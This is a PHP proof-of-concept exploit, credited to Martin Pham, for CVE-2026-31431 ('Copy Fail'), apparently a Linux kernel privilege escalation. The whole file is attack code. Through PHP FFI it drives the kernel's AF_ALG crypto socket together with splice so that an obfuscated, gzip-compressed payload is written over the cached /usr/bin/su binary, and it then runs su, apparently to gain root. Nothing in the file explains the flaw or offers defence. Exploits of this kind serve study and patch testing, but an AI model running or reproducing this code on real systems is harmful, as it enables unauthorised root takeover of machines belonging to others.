<?php
/**
 * CVE-2026-31431 (Copy Fail) PHP PoC
 *
 * @author   Martin Pham <i@mph.am>
 * @license  MIT
 */

$ffi = FFI::cdef("
    typedef unsigned int socklen_t;
    typedef unsigned short sa_family_t;

    struct iovec {
        void  *iov_base;
        size_t iov_len;
    };

    struct msghdr {
        void         *msg_name;
        socklen_t     msg_namelen;
        struct iovec *msg_iov;
        size_t        msg_iovlen;
        void         *msg_control;
        size_t        msg_controllen;
        int           msg_flags;
    };

    int socket(int domain, int type, int protocol);
    
    int bind(int sockfd, const void *addr, socklen_t addrlen);
    int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
    int accept(int sockfd, void *addr, socklen_t *addrlen);
    
    ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags);
    int pipe(int pipefd[2]);
    ssize_t splice(int fd_in, long *off_in, int fd_out, long *off_out, size_t len, unsigned int flags);
    int open(const char *pathname, int flags);
    int system(const char *command);
    int close(int fd);
", "libc.so.6");

if (!defined('AF_ALG')) define('AF_ALG', 38);
if (!defined('SOL_ALG')) define('SOL_ALG', 279);
define('ALG_SET_KEY', 1);
define('ALG_SET_AEAD_AUTHSIZE', 5);

function c($f, $t, $payload) {
    global $ffi;
    
    $s = $ffi->socket(AF_ALG, 5, 0); 
    if ($s < 0) return;

    $addr_len = 88;
    $c_addr = $ffi->new("char[$addr_len]", false);
    
    $packed_addr = pack("vA64A22", AF_ALG, "aead", "authencesn(hmac(sha256),cbc(aes))");
    FFI::memcpy($c_addr, $packed_addr, strlen($packed_addr));
    
    if ($ffi->bind($s, $c_addr, $addr_len) < 0) {
        $ffi->close($s);
        return;
    }
    
    $key_bin = hex2bin('0800010000000010' . str_repeat('0', 64));
    $c_key = $ffi->new("char[" . strlen($key_bin) . "]", false);
    FFI::memcpy($c_key, $key_bin, strlen($key_bin));
    $ffi->setsockopt($s, SOL_ALG, ALG_SET_KEY, $c_key, strlen($key_bin));
    
    $authsize_val = $ffi->new("unsigned int", false);
    $authsize_val->cdata = 4;
    $ffi->setsockopt($s, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, FFI::addr($authsize_val), 4);
    
    $u = $ffi->accept($s, null, null);
    if ($u < 0) {
        $ffi->close($s);
        return;
    }

    $data_payload = str_repeat("A", 4) . $payload;
    $c_payload = $ffi->new("char[" . strlen($data_payload) . "]", false);
    FFI::memcpy($c_payload, $data_payload, strlen($data_payload));

    $iovec = $ffi->new("struct iovec");
    $iovec->iov_base = FFI::cast("void *", $c_payload);
    $iovec->iov_len = strlen($data_payload);
    
    $msghdr = $ffi->new("struct msghdr");
    $msghdr->msg_iov = FFI::addr($iovec);
    $msghdr->msg_iovlen = 1;
    
    $ffi->sendmsg($u, FFI::addr($msghdr), 0);
    
    $pipefd = $ffi->new("int[2]");
    $ffi->pipe($pipefd);
    
    $o = $t + 4;
    $ffi->splice($f, null, $pipefd[1], null, $o, 0);
    $ffi->splice($pipefd[0], null, $u, null, $o, 0);
    
    $ffi->close($u);
    $ffi->close($pipefd[0]);
    $ffi->close($pipefd[1]);
    $ffi->close($s);
}

$hex_payload = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";
$e = gzuncompress(hex2bin($hex_payload));

$fd = $ffi->open("/usr/bin/su", 0);
if ($fd < 0) die("Permission denied or /usr/bin/su not found.\n");

for ($i = 0; $i < strlen($e); $i += 4) {
    c($fd, $i, substr($e, $i, 4));
}

$ffi->system("su");
